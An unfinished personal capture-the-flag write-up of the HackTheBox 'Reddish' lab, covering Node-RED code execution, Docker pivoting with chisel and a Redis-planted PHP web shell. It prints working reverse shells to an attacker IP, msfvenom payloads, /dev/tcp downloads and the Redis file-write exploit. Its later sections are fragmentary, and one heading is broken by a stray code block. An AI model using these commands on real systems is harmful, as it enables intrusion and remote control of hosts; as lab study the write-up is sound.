# Reddish

Name: Reddish
Date:  24/08/2022 - 29/3/2023
Difficulty:  Insane
Goals:  
To practice:
- Different ways pivot, how to, the limitation, risks
- Linux related machines not done one recently 
- Database hacking
- Be handheld through an insane machine to know how far I many connections in my brain I have to go - roughly scaled between scarily alot and ton
	- Reasoning comes from being good guitar. Sometime you just to sit there and be wowed and try anyway, clumsy try, find the parts that are difficult and find similarly easiler elements elsewhere, [More Rocky](https://www.youtube.com/watch?v=hHpFSQMUxj4), [More Cheesey](https://www.youtube.com/watch?v=yGZsnbPCv1I) or [More British](https://www.youtube.com/watch?v=pt-Yc2rzOOM) or more [Bass](https://www.youtube.com/watch?v=Sa0upTDZDYQ) or [Spanish](https://www.youtube.com/watch?v=NIKWBdthzg4) - combine all of that and keep building
Learnt:
1. I need to try switching more Web Requests
2. TCP reply not listen back on shell...
3. cat file transfer
4. Wonders/Horrors /dev/shm directory
5. Manual (Heard but not tried till now) Go Programs by using ldflags and upx packing from 10Mb to 3Mb!
6. Power of chisel only.
7. Excalidraw is time consuming compare to pen and paper but looks good, I guess I'll add a drawing pad to eventually one day shop list 
8. Favicons were a larger indication of where I am capable of expanding further intuitively as it boils down too:
	1. What is in front of you - what can I use to solve X - not what could be in front of you 
	2. What sticks out on a blank screen with Favicon and response error code.
9. The power of `nohup`  or no hangup and `&` 
Beyond Root:
- Omni-Tool-Usage for port redirection - but demostrate with Ubuntu server for tools cannot just install onto the box 
- Clarity over all possible options 
- Revamp my Port-Redirection article(s), Chisel

Returning to this box as I left it in a incomplete state while taking so much information away in 2022. As of 2023 I need a primer on a large potential part of OSCP, virtual and physical networking for AZ. Given this is the forth time returning to this box and the fifth time following along, I must note that I learnt so much and I am here to finish this as helped-through andmake sure port-redirection is engrained in my brain forever. I used and will use again [Ippsec Reddish Video](https://www.youtube.com/watch?v=Yp4oxoQIBAM), [0xDF write up](https://0xdf.gitlab.io/2019/01/26/htb-reddish.html), [0xDF Tunneling and Pivoting](https://0xdf.gitlab.io/2019/01/28/pwk-notes-tunneling-update1.html) and [0xDF using chisel with SSF](https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html)
As a general note to any unsuspecting readers, this a continuation of trying and so it contains me attempt to figure out were my recon is well tuned and not, but therefore there are also tangents including later additions of trying to figure out by comparison what I not doing correctly or efficiently. In hindsight and the most unhelpful statement to less experienced is that CTF are meant to be solved the pieces exist on the box to solve them, but also rabbit holes that will lead you astray, which is both something you have to learn to live and learn to overcome. There is a very steep learning curve with hacking and CTFs ramp upin a unrealistic way to taeach you a skill of avoiding the rabbit hole, but also the finding the alogorically thread and pull on it, but also collecting all the threads and the "purpose" of the machine. The latter being a SysAdmin it is easy to know that server X does Y function for a business, but when you are doing CTFs it was hard doing these alone without some these obvious to other concepts just apparent. 

## Recon

The time to live(ttl) indicates its OS. It is a decrementation from each hop back to original ping sender. Linux is < 64, Windows is < 128.
![ping](HackTheBox/Retired-Machines/Reddish/Screenshots/ping.png)

#### Note to self...

I want to note some of the differences to mine and Ippsec's more efficient Recon, although its is a scripted video it is still someone else approach to Web Hacking to assimilate to my own. Firstly Icons favicons, in the Haddix Bug Bounty Hunter Methodology and on serveral podcasts Haddix mentions a friend whom had a expertise in favicon abuse. 

Unknown Application?
- Download the Favicon and reverse image search

#### Return to WTF is this

A reason to use google more than other is search engines with great seach scope can help you identify the RedNode Application. I feroxbuster and then tried the /red/about directory and got this post request :
This is such a weird request to me. We get back HTTP/2 of all things.

![1080](weirdtokenrequest.png)

To get the About.html, grepping for `red`
![](greppingtheabout.png)`

Reveal node-red...

I still think the favicon is cooler, but I a happy that I am improving my searching or dorking ability somewhat as I have be worrying I am too meticulious or no where near enough to get anywhere. **BUT** I would have notice the key, but not found it.. I know 
![posting](ippsecposts.png)
Day 1 : `ab68fb463e681b499d99226ce92e12e9`
Day 2: returned it generate a new `b1a51218f30da47d4f45b52972804d1a`
Day 3: After along time away: `695613754dfef3f53a0b18b02d805047`
Day 4: After some practice elsewhere
Day 5-7: `c811816e50d58bd34204067b8ba3ae80`
Day 8: `13492c3c28a60b2a4a00971f3c9a6629`

As of Day 5-8; I have learn so much as to why my approaches were good
1. Manual combing the with burp site and asking questions is really good
1. Given time limits I was and set myself to try to expand my experience of different possiblities of problem, rushing and missing the key seems so silly, but indicative of me stress testing to push my brain to make me care a  great deal about hacking and solving boxes 
	- Neurologically very important
1. I answer the question of what content is accessible with feroxbuster 
and not as well rounded:
1. I found that the best way to track myself and will for changing request types was curl
	1.  Although Ippsec is very good there are somethings that reveal to me through hacking that some there are much much better ways to keep notes and tools for the job for cyclic enumeration and exploitation 
		1. Watching some of the top HTB hackers you realise that they all do one thing that Ippsec video do not teach: really simple stuff first and they show it. XCT remind you that tooling is important, but if you brain knows just grep it that is something more time-savingly awesome and the really key to how people like xct get first bloods. They do really simple stuff to get answer that everyone else who is still learning the technology and tools miss both learning.

`curl -X` is so much more time friendly and note-keeping friendly, than burp, but you need to manually feel out the site. Keeping track each request obscured by the GUI. Maybe burp pro irons this into something really usable, but intutively that just seems excess layering and expensive. 
![](metametathereruncurlisgood.png)

[Node-RED](https://nodered.org/about/) is a program tools visually displaying and interactable function of a program in chart.

![](no-exploits.png)

This section was a real hammered  home of the, how can I achieve my objective with what is in front of me. I think I have been concern about learning about and I will endeavour to try more boxes like this or to make VMs with this level of interactability, I remember there is some proving ground boxes that are more like this. This box is possibly one of the best boxes I have ever spent time on. I have spent alot on this box just learning.

## Exploit

Application?
- What can you do with it to CRUD the filesystem, network, etc?
- Can you replicate it 

![nodered](NODE-red.png)

TCP reply to! This is misconfiguration vulnerablity as we are affectively RCE the box with pretty much unlimited functionality through the hosting of this service using the host server. From DoSing, using it a proxy or tunnel, http server, C2 or email (it has social media and email functionality) or run javascript to mine cryptocurrency on the server owners electricity bill would be eye watering.

![shell](shell.png)

## Docker Foothold

Spawning TTYs
```bash
echo 'os.system('/bin/bash')'
/bin/sh -i
/bin/bash -i
perl -e 'exec "/bin/sh"'
lua -e "os.execute('/bin/sh')"
ruby -e 'exec "/bin/sh"'
# From within vi
:!bash
:set shell=/bin/bash:shell
# From within nmap
!sh
```

First one and half is a half and then get two for the two is one reverse shell rule.
1. `bash -c 'bash -i >& /dev/tcp/$IP/$PORT 0>&1'`
2. Perl is on the box:
```bash
perl -e 'use Socket;$i="10.10.14.123";$p=8001;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'
```

[Reading 0xDF try various functionality of the NodeRed application](https://0xdf.gitlab.io/2019/01/26/htb-reddish.html#code-execution--shell-in-node-red), I decided that an additional beyond root would be to do the same and the highest goal being to try to create a proxy via the NodeRED. In the beyond root section I will outline a proxy and other stuff both 0xdf and atleast one idea if I do not complete a proxy.

As a Day <4 note to self: even though I like ncat and netcat, I am glad to finally be prompted to use it as a file transfer mechanism instead of other tools. Similar to trying out powercat it felt fun, but also gratting a tad as I always see it on Enumeration Script scans after I run it.. but I don't check its there before file transfering.

Checking whether I can run in memory on the box:
![](noexecshm.png)

After researching and making go compilation and doing some of [[Hololive-Writeup]]. With shell stability in mind after returning to this machine for the third time, although I will do it this way just for my own peace on mind after, I want recall proxychaining and using chisel to the port forward to scan the subset with nmap. If we had NC we could do port scanning like this: `nc -zv 172.18.0.1 1-65535`. One thing to consider is that the noexec flag has been set on /dev/shm 

![](noexeconshm.png)

[/dev/shm is a common directory for marshalling and operating from in Linux for attackers as it directory that is a tempory file storage that uses RAM for the backing store](https://superuser.com/questions/45342/when-should-i-use-dev-shm-and-when-should-i-use-tmp. It is flushed leaving no trace of execution or what was put in that directory. It is also faster as than disk storage. For hardening
```bash
# To check flags 
mount | grep shm 
# Mitigation
sudo mount -o remount,noexec /dev/shm
```

Ippsec's `cat` file transfer is OP. WOW on the cat file transfer, I have not seen this on any OSCP cheatsheets!
```bash
bash -c "cat < /dev/tcp/$IP/$PORT > /tmp/LinEnum.sh"
```

With the new and improved [Hacktools](https://github.com/LasCC/Hack-Tools) tried meterpreter https and the nice copy and paste workflow... 
```bash
# Initial shell from Node RED
nc -lvnp 8000
# call 
bash -c 'bash -i >& /dev/tcp/10.10.14.132/8002 0>&1' &
# Beware it does not auto update fields!
msfvenom -p linux/x64/meterpreter_reverse_https LHOST=10.10.14.132 LPORT=4444 --platform linux -a x64 -n 200 -e cmd/generic_sh -i 4 -f elf -o rshell

msfconsole -qx "use exploit/multi/handler; set PAYLOAD linux/x64/meterpreter_reverse_https; set LHOST 10.10.14.123; set LPORT 4444; run"

nc -lvnp  9696 < met
# On Node RED:
bash -c "cat < /dev/tcp/10.10.14.132/9696 > /tmp/met"
# chmod and use nohup to persist after ctrl+c the shell to get it back again
chmod +x met
nohup ./met
[Ctrl + c]
# Restart secondardy shell from the initial
bash -c 'bash -i >& /dev/tcp/10.10.14.132/8002 0>&1' &
# Meterpreter
meterpreter > shell

```

Previous days LinEnum finds Docker
![docker](weareindocker.png)

```bash
ls -la /
cat /proc/1/cgroup
# What does the network interfaces mean for routing and connectivity?
ip a
# How is the container connecting with other IPv4 addresses?
cat /proc/net/arp

```

0xDF's network enumeration got me interested in /proc and /proc/net specifically
```bash
# ARP table is useful as even in the cloud Ipv4 is still prodominant
# ARP is used to resolve IPv4 addresses, therefore addresses here are addresses that communicated to box
cat /proc/net/arp
```

I only got the .18.0.1 - given that it is a very low address and we are not in the cloud where we assume the IaaS, PaaS, etc take many of the lower addresses and obvious not the final .255 address of the subnet - we can understand 0xDF assumption that it is a gateway address i.e an address to map out another set of address in a subnet or (V)network.
![](nodot19.png)

[/Proc.txt kernel documentation](https://www.kernel.org/doc/Documentation/filesystems/proc.txt)
[Linux Kernel Networking](https://www.kernel.org/doc/Documentation/networking/)
[/proc/net/tcp](https://www.kernel.org/doc/Documentation/networking/tcp.txt) - [tcp.cong.c](https://github.com/torvalds/linux/blob/master/net/ipv4/tcp_cong.c) congestion control algorhythms on a single queue, with flagging to indicate a frame state on the queue:
- search the queue
- locking to prevent accidental use
- state management: thresholds and identification management
- module management: cleanup, default or other configuration setting  for congestion control
- congestion handling between socket and kernel
- reinitialisation and initialation everything above but kernel and sockets

Or you could manually checked the root directory for dot files and observed the `.dockerenv`, the above check for Docker contain is in the `/proc/1/cgroup`.
![](alwayslslainroot.png)

Although it is not mentioned a good thing to then check with Docker would be IP address as it is may have its own routing configuration to the host box.
![docker](dockerips.png)
Ping sweeping appears in both RedTeamFieldManual and Netmux operator handbook.
```bash
for ip in $(seq 1 5); do
	ping -c 1 172.18.0.$ip > /dev/null && echo "Online: 172.18.0.$ip"
done
```

Oneliner versions
`for ip in $(seq 1 5); do ping -c 1 172.18.0.$ip > /dev/null && echo "Online: 172.18.0.$ip"; done`
`for ip in $(seq 1 5); do ping -c 1 172.19.0.$ip > /dev/null && echo "Online: 172.18.0.$ip"; done`

![](pingsweepresult.png)

Identifying other boxes on the network.
- arp cache for IPv4 resolution

Oxdf better one liners 
```bash
# The reason I copy and paste these is the output is better handled 
# it is done in the background
# Errors are visible
for i in $(seq 1 254); do (ping -c 1 172.18.0.$i | grep "bytes from" | cut -d':' -f1 | cut -d' ' -f4 &); done

for i in $(seq 1 254); do (ping -c 1 172.19.0.$i | grep "bytes from" | cut -d':' -f1 | cut -d' ' -f4 &); done                    
```

Fingerprinting without nmap, etc using brain and cli. 

Port scanning with bash and /dev/tcp  
```bash
for port in 22 25 80 443 8080 8443; do (echo Hello > /dev/tcp/172.19.0.3/$port && echo "open - $port") 2> /dev/null; done

for port in 22 25 80 443 8080 8443; do (echo Hello > /dev/tcp/172.18.0.1/$port && echo "open - $port") 2> /dev/null; done
```

The output for command above
![1000](port80on3.png)

Ippsec inspired reverse pivot excalidraw-ing
![1080](ippsecreversepivotpowerpoint.excalidraw)

Ippsec discuss reducing the size of go binaries
```bash
# Remember if you compile for another system
# On target machine:
ldd --version # linux and windows
CGO_ENABLED=0 go build -ldflags="-s -w" # For static without c runtime libraries
# To mimise binary size
# -s strip binary of debug info
# -w strip of dwarf infomation 
upx chisel
```

Improved cli
```bash
# Setup proxychains and chisel
# Added -host over 0.0.0.0 default which is expose to the internet
./chisel server -p 9000 -reverse -v
# 
# 0xDF notes that the .2-4 address randomise for www,nodered and redis
targetIP= # the IP we want to target only accessible from nodered.
targetPORT= # the port we what to view from the portscan

./chisel client 10.10.14.132:9000 R:127.0.0.1:9001:$targetIP:$targetPORT
proxychains nmap -sT -F 
```


You could also do the same with the telling the entire subnet that nmap is being used with [naabu](https://github.com/projectdiscovery/naabu)  `-proxy string`  with socks5 proxy `(ip[:port] / fqdn[:port])`. From hellscape of the [[Squid-Helped-through]] machine where I hit the hard wall finding the proxy, but experiementing with what can and cannot be tunnelled.

Burpsuite socks proxy
![](proxyburpproxyception.png)

Through burpsuite 
![](reddishwebpage.png)

Ippsec points out a security risk being that if listening on 0.0.0.0 then is directly accessible by anyone. One thing not pointed out by either Ippsec or 0xDF is that with nikto scan it find a info.php page containing alots of information as it is phpinfo(). Most importantly: `Linux www 4.4.0-130-generic #156-Ubuntu SMP Thu Jun 14 08:53:28 UTC 2018 x86_64`

```go
chisel client 10.10.10.10:8000 R:127.0.0.1:8001:172.19.0.3:80
// The server also create Fingerprints 
```

![](webpagefunction.png)
Some checks urls
![](forbiddencodedfolder.png)

hits 
![](hits.png)

Ippsec provides justification based on the details in the code that there is database. Therefore on the network interface IP could be docker containers, database and the `http://172.19.0.3/` being the webserver. 

```bash
for port in $(seq 1 65535); do (echo Hello > /dev/tcp/172.19.0.2/$port && echo "open - $port") 2> /dev/null; done
```

... and the output:
![1000](portscan-2.png)

Using nmap -sC and -sV to identify for the screenshot:
![](redisrce.png)
I am sure I have done this Redis RCE on THM, but I want to read to hammer the RESEARCH button in my brain. Also to count issue in problem solving and desktop space, the beginning on noted diagrams, less ascii art. Introducing [Excalidraw for Obsidian](https://github.com/zsviczian/obsidian-excalidraw-plugin). 

![](Reddish-InitialThinking.md)


![](bamsearchsploit.png)
Before reading the exploitation of Redis without metasploit. Tunnelling to get to that Redis database is 

![](excellent.png)

[Reading](https://packetstormsecurity.com/files/134200/Redis-Remote-Command-Execution.html) this database RCE involves write file to the file system by putting out file into Redis server memory and then transfering it.
```bash
$ redis-cli -h 192.168.1.11 flushall
$ cat foo.txt | redis-cli -h 192.168.1.11 -x set crackit
# Looks good. How to dump our memory content into the authorized_keys file? 
# That’s kinda trivial.
$ redis-cli -h 192.168.1.11192.168.1.11:6379> config set dir /Users/antirez/.ssh/OK192.168.1.11:6379> config get dir
1) "dir"
2) "/Users/antirez/.ssh"192.168.1.11:6379> config set dbfilename "authorized_keys" 
OK
192.168.1.11:6379> save
OK
```

There is also [https://github.com/Ridter/redis-rce/blob/master/redis-rce.py](https://github.com/Ridter/redis-rce/blob/master/redis-rce.py) creates a server to interact with the redis database.  

https://packetstormsecurity.com/files/134200/Redis-Remote-Command-Execution.html

https://0xdf.gitlab.io/2019/01/26/htb-reddish.html#pivoting

## Returning Day 8-9 to Redis and beyond

The initial first four days for attempts got all the pieces ready for me, but as a remediation against step over issues  that I have overcome over months of other boxes and research.  

Chiselling to box
![](day8chiseltoredis.png)
A breakdown of this to really hammer home everything I have learnt over the last 6 months:
```bash
# First client to connect to a server
chisel client $serverIP:$serverPort
# Server is configured for reverse with -reverse 
# Therefore the syntax is R: for reverse
# Serving the traffic TO localhost and port
R:$localhostIPv4:$locahostPort: # :...
# ...:
:172.19.0.2:6379 # The address and port to reverse port forward traffic so that it is visible from 
# $localhost:$localPort
```
We are reversing - ie using the NodeRED box to send traffic that only it can reach to a chisel-server that can serve the traffic to us. Port redirection locally would be if we were using a client from our machine. Dynamic port redirection would be that we can access any address and port behind the NodeRED from one server ie .4, .3 and .2 addresses.

nmap as proof
![](nmapredisthroughrevportfwdproof.png)

Following along with Ippsec till we have a shell he demonstrates [Redis RCE from packetstormsecurity](https://packetstormsecurity.com/files/134200/Redis-Remote-Command-Execution.html). 
Firstly the article is suggesting to check if we can access the instance
```bash
nc localhost 6379
# We provide:
echo "Hey no AUTH required!"
```
We get back:
![](redisechoheynoauthrequired.png)
Therefore we can access it and the article then explain that...*"no AUTH required. Redis is unprotected without a password set up"*

It then suggest to create an ssh key, but we do not have ssh on the box and prosumably the redis box does not either. This is similar to the real world cloud environments where sysadmin should have only just in time access to the machines that do not need ssh, rdp - ask yourself should a container really need ssh after configuration. The anwser is no, we can redeploy the updated version of the machine as it is infrastructure as code being a docker container. Ippsec discuss the enumeration of connection between database and the web application.

For hits to be reflected on the page we both the web app, the database and the `ajax.php?test=` top connect the two. Testing how those interact is important.

- How do the applications and services running connect?
	- If they connect i.e web-app has URI that queries database, using the URI what can be done to both services - commands, api calls, etc?

Following along with Ippsec or the article
```bash
$ redis-cli -h 192.168.1.11 flushall$ cat foo.txt | redis-cli -h 192.168.1.11 -x set crackitLooks good. How to dump our memory content into the authorized_keys file? That’skinda trivial.

$ redis-cli -h 192.168.1.11192.168.1.11:6379> config set dir /Users/antirez/.ssh/OK192.168.1.11:6379> config get dir1) "dir"2) "/Users/antirez/.ssh"192.168.1.11:6379> config set dbfilename "authorized_keys"OK192.168.1.11:6379> saveOK
```

WE need to use [FLUSHALL](https://redis.io/commands/flushall/)
```bash
# Delete all the keys of all the existing databases, not just the currently selected one. This command never fails.
flushall [ASYNC | SYNC]
```

The rationale behind the last three lines are before the comment... woops.
1. We need a web shell, that written in php 
2. To do such that it can be accessed by the webpage from redis we tell redis to
3. have some content we call `subscribetoippsec` populating the string with a web shell 
4. then tell redis the filename to be served by the webpage call cmd.php
5. then where that file should stored
6. the flushall will flush all the keys and values that we are providing over netcat that may exist in memory 
```bash
nc localhost 6379 
flushall
set subscribetoippsec "<? system($_REQUEST['cmd']); ?>"
config set dbfilename cmd.php
config set dir /var/www/html
# Then do not be an idiot and save it...
save
```

We need another shell for Day 8 and something I realised was is that the inital shell with `[object Object]` can make more shells. This seems CTFy  `nohup` and `&` with both I discover from [hexadix](https://hexadix.com/use-nohup-execute-commands-background-keep-running-exit-shell-promt/) so I could also now do the same with meterpreter for the metasploit `portfwd` command with `meterpreter`
![](chiselisnowajob.png)

Then I need to reconfigure burpsuite for a SOCKs proxy, returning to redo the webshell that I never saved...
![](pittytheunsavedfool.png)
Making sure to name the file correctly....and subscribe to ippsec harder
![](subscribetoippsecharder.png)

File is there

![](flabberghaster.png)

Burpsuite was irrating me, also reddish I need to keep the connection open as it is in the cache of redis.
![](burpisirratingme.png)

Ippsec and 0xDF initally check the networking in prioritising pre reverse shell. Ping will not return back. This is were I am completely unknown territory as to pivoting through. [[Hololive-Writeup]] has some of this, but through C2s so multiple manual approaches is now an additional requirement for my beyond rooting of this box. 

Also to make matter worse/better (in that I do not have to cleanup afterward) the Server also cleans up so we have continuously create the web shell. Also burpsuites URL encoding is a kicker where I need both to work for some time.. Also learnt how to add the video into markdown. 

<iframe width="560" height="315" src="https://www.youtube.com/embed/Yp4oxoQIBAM" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>


Instead I am going to watch the xct and ippsec version of their writeups for the Anubis machine as it pivot through a container with chisel and proxychains and burp for one day forgetting all the steps and doing the box without any real idea of the box for: [[Anubis-Writeup]]

Returning for Day 9 of the slow march through Reddish I decided that once again burpsuite was being either misconfigured by myself as I have not done this since the settings search feature of burpsuite, which is awesome , but I then decided to use cyberchef as xct uses cyberchef for encoding and the wonders of curl. My chisel usage is spot on again it is my configuration of burp. 

![1080](curlbutnoburp.png)

Trials and Trials continue on I suppose. Reiterating again because this is not a true writeup.
![](ipaof1271904.png)

1. Reddish exploit:
```bash
nc localhost 6379 
echo "Hey no AUTH required!"
flushall
set subscribetoippsec "<? system($_REQUEST['cmd']); ?>"
config set dbfilename cmd.php
config set dir /var/www/html
save
# Then do not be an idiot and save it...
# 0xDF 

#!/bin/bash

# https://0xdf.gitlab.io/2019/01/26/htb-reddish.html#webshell
redis-cli -h 127.0.0.1 flushall
redis-cli -h 127.0.0.1 -x set subscribetoippsec "<? system($_REQUEST['cmd']); ?>"
redis-cli -h 127.0.0.1 config set dbfilename cmd.php
redis-cli -h 127.0.0.1 config set dir /var/www/html
redis-cli -h 127.0.0.1 save
exit
```
2. 
```bash
curl -X POST http://localhost:10001/cmd.php -d "cmd=perl%20-e%20'use%20Socket;$i=%2210.10.14.123%22;$p=8005;socket(S,PF_INET,SOCK_STREAM,getprotobyname(%22tcp%22));if(connect(S,sockaddr_in($p,inet_aton($i))))%7Bopen(STDIN,%22%3E&S%22);open(STDOUT,%22%3E&S%22);open(STDERR,%22%3E&S%22);exec(%22/bin/bash%20-i%22);%7D;'" --output -
```





## Finally a Foothold


## PrivEsc 


      
## Beyond Root





#### Omni-Tooling - Port Redirection
https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html
https://0xdf.gitlab.io/2019/01/28/pwk-notes-tunneling-update1.html
- sshuttle
- ssh
	- 0xDF instuction 2.  Copy an ssh client to nodered, and ssh back into my kali box with a reverse tunnel.


Back to Reddish
- `meterpreter portfwd` with  0xDF instructions:
1.  Get a meterpreter session with nodered, and use the `portfwd` capability to tunnel from my local box into the network (like ssh tunneling).

#### Omni-Tooling - Pivoting through a network

We do not have access to some parts of this box
[0xdf uses SOCAT](https://0xdf.gitlab.io/2019/01/26/htb-reddish.html#www--redis-containers) 

1

#### Use Node RED to understand Virtual networking 

3.  Build a listening interAnd quick bash script to go back add the video to each as a iframe
```bash

YOUTUBEVIDID=
# 
echo ""
<iframe width="560" height="315" src="https://www.youtube.com/embed/$YOUTUBEVIDID" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>

```face (likely web) with NodeRed, and use that to tunnel traffic.

https://nodered.org/docs/user-guide/

1. Highest possible goal is a proxy

[How to build a tcp proxy](https://robertheaton.com/2018/08/31/how-to-build-a-tcp-proxy-1/)
```goat
[kali] <-> [nodered] -> [X]
	 <- [proxy back] <- 
	 -> [tell nodered to goto [x] ->  
```


- ListenToKali
-  ReplyToKali - incorrect cmd or cmd and proxied response

- Recieve-CMD-ServerLogic - incorrect cmd or attempt cmd

- ProxyOutBound with correct cmd
- ProxyInbound - recieve information back from cmd ran

- Proxy-Back-ServerLogic handle and return to ReplyToKali

```bash
# Kali - cmd input
ncat -nv $ip 9000
<cmd>
# Listener to recieve 
ncat -lvnp 9001
```

function block, switch per field: cmd, ip, port
```goat
exec (payload)->  Switch -> 
					| 
				return invalid command payload

tcp-request - set with msg.host, msg.port
```


#### And quick bash script to go back add the video to each as a iframe
```bash

YOUTUBEVIDID=
# 
echo ""
<iframe width="560" height="315" src="https://www.youtube.com/embed/$YOUTUBEVIDID" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>

```